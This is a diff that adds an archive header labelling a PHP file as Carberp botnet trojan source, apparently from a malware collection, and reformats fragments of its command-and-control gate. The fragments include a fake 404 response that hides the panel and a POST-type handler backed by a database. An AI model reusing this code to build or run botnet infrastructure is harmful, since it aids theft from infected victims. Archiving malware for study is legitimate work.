@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 error_reporting(0);
@@ -28,7 +39,8 @@ if($config['getkl'] == 1){
 	exit;
 }
 
-if($config['scramb'] == 1 && $gateway != true){	header("HTTP/1.1 404 Not Found");
+if($config['scramb'] == 1 && $gateway != true){
+	header("HTTP/1.1 404 Not Found");
 	header("Status: 404 Not Found");
 	print(file_get_contents($dir . '404.html'));
 	exit;
@@ -36,7 +48,8 @@ if($config['scramb'] == 1 && $gateway != true){	header("HTTP/1.1 404 Not Found"
 
 if(empty($_POST['type'])) print_data('NOT TYPE', true, false);
 $write = true;
-switch($_POST['type']){	case '1':
+switch($_POST['type']){
+	case '1':
 		$cfg_db = get_config();
 		$mysqli = new mysqli($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
 		if(mysqli_connect_errno()) print_data('DB ERROR', true, false);
